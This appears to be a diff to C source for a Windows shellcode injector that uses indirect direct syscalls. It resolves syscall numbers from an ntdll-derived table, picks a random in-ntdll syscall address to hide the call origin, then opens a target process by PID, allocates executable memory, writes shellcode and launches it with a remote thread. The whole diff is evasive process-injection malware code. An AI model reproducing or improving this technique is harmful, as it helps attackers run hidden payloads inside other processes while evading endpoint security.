@@ -1,6 +1,8 @@
 #include <basetsd.h>
+#include <stdlib.h>
 #include <windows.h>
 #include <stdio.h>
+#include <time.h>
 
 #include "syscall.h"
 
@@ -56,39 +58,61 @@ int main(int argc, char *argv[]) {
     return EXIT_FAILURE; 
   }
 
-  DWORD dwPid = atoi(argv[1]);
+  SSNTable t = { 0 };
+  if(SSNTableInit(&t) != 0) {
+    fprintf(stderr, "Failed to init SSN Table\n");
+    return 1;
+  }
 
-  HANDLE hNtdll = GetModuleHandle("ntdll.dll");
+  DWORD dwPid = atoi(argv[1]);
   
-  LPVOID lpNtOpenProcess           = GetProcAddress(hNtdll, "NtOpenProcess");
-  LPVOID lpNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-  LPVOID lpNtWriteVirtualMemory    = GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-  LPVOID lpNtCreateThreadEx        = GetProcAddress(hNtdll, "NtCreateThreadEx");
+  DWORD dwNtOpenProcess           = SSNTableSearch(&t, "NtOpenProcess").ssn;
+  DWORD dwNtAllocateVirtualMemory = SSNTableSearch(&t, "NtAllocateVirtualMemory").ssn;
+  DWORD dwNtWriteVirtualMemory    = SSNTableSearch(&t, "NtWriteVirtualMemory").ssn;
+  DWORD dwNtCreateThreadEx        = SSNTableSearch(&t, "NtCreateThreadEx").ssn;
+
+  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtOpenProcess", dwNtOpenProcess, dwNtOpenProcess);
+  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtAllocateVirtualMemory", dwNtAllocateVirtualMemory, dwNtAllocateVirtualMemory);
+  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtWriteVirtualMemory", dwNtWriteVirtualMemory, dwNtWriteVirtualMemory);
+  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtCreateThreadEx", dwNtCreateThreadEx, dwNtCreateThreadEx);
+
+  // TODO: find more elegant solution
+  srand(time(0));
+  g_lpSyscallAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), t.items[rand() % t.count].lpFuncName);
+#ifdef WINE
+  g_lpSyscallAddr += 24;
+#else 
+  g_lpSyscallAddr += 0x12L;
+#endif
+  fprintf(stdout, "g_lpSyscallAddr = 0x%p\n", g_lpSyscallAddr);
+
+  SSNTableFree(&t);
 
   CLIENT_ID CID = { .UniqueProcess = (HANDLE)(ULONG_PTR)dwPid, .UniqueThread = 0 };
   OBJECT_ATTRIBUTES OA1 = { .Length = sizeof(OBJECT_ATTRIBUTES), 0 };
   OBJECT_ATTRIBUTES OA2 = { .Length = sizeof(OBJECT_ATTRIBUTES), 0 };
 
   fprintf(stdout, "[i] Opening handle to process %ld\n", dwPid);
-  s = Syscall(GetSSN(lpNtOpenProcess), &hProcess, PROCESS_ALL_ACCESS, &OA1, &CID);
+  s = Syscall(dwNtOpenProcess, &hProcess, PROCESS_ALL_ACCESS, &OA1, &CID);
   if (s) {
     fprintf(stderr, "[-] NtOpenProcess failed (0x%lx)\n", s);
     return EXIT_FAILURE;
   }
   fprintf(stdout, "[i] Loading payload to remote process memory\n");
-  s = Syscall(GetSSN(lpNtAllocateVirtualMemory), hProcess, &buffer, 0, &shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  s = Syscall(dwNtAllocateVirtualMemory, hProcess, &buffer, 0, &shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (s) {
     fprintf(stderr, "[-] NtAllocateVirtualMemory failed (0x%lx)\n", s);
     return EXIT_FAILURE;
   }
-  s = Syscall(GetSSN(lpNtWriteVirtualMemory), hProcess, buffer, shellcode, sizeof(shellcode), &written);
+  fprintf(stdout, "[+] Successfully allocated %zu bytes in remote process memory\n", shellcodeSize);
+  s = Syscall(dwNtWriteVirtualMemory, hProcess, buffer, shellcode, sizeof(shellcode), &written);
   if (s) {
     fprintf(stderr, "[-] NtWriteVirtualMemory failed (0x%lx)\n", s);
     return EXIT_FAILURE;
   }
   fprintf(stdout, "[+] Successfully written %zu bytes to remote process memory\n", written);
   fprintf(stderr, "[i] Running payload...\n");
-  s = Syscall(GetSSN(lpNtCreateThreadEx), &hThread, THREAD_ALL_ACCESS, &OA2, hProcess, (PTHREAD_START_ROUTINE)buffer, NULL, 0, 0, 0, 0, NULL);
+  s = Syscall(dwNtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, &OA2, hProcess, (PTHREAD_START_ROUTINE)buffer, NULL, 0, 0, 0, 0, NULL);
   if (s) {
     fprintf(stderr, "[-] NtCreateThreadEx failed (0x%lx)\n", s);
     return EXIT_FAILURE;
